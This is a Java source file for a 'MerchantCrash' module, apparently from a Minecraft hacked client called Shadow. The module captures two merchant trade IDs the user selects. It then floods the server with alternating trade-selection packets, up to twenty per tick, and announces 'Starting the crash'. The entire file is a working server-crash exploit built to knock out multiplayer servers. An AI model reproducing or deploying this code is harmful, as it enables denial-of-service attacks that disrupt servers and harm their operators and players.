package net.shadow.feature.module.crash;

import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;
import net.shadow.Shadow;
import net.shadow.event.events.PacketOutput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;

public class MerchantCrash extends Module implements PacketOutput {
    static boolean isSelecting = false;
    static int slot1 = -1;
    static int slot2 = -1;
    final SliderValue r = this.config.create("Repeat", 1, 1, 20, 0);
    int ticks;

    public MerchantCrash() {
        super("MerchantCrash", "Spams merchant trades", ModuleType.CRASH);
    }

    @Override
    public void onEnable() {
        Shadow.getEventSystem().add(PacketOutput.class, this);
        ChatUtils.message("Waiting for two trade packets to be sent");
        isSelecting = true;
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketOutput.class, this);
        isSelecting = false;
        slot1 = -1;
        slot2 = -1;
    }

    @Override
    public void onUpdate() {
        if (!isSelecting) {
            for (int i = 0; i < r.getThis(); i++) {
                if (ticks % 2 == 0) {
                    Shadow.c.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(slot1));
                } else {
                    Shadow.c.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(slot2));
                }
                ticks++;
            }
        }
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onSentPacket(PacketOutputEvent event) {
        if (event.getPacket() instanceof SelectMerchantTradeC2SPacket packet) {
            if (isSelecting) {
                if (slot1 == -1) {
                    slot1 = packet.getTradeId();
                    ChatUtils.message("First Trade Selected");
                } else {
                    slot2 = packet.getTradeId();
                    ChatUtils.message("Second Trade Selected");
                    ChatUtils.message("Starting the crash");
                    isSelecting = false;
                }
            }
        }
    }
}
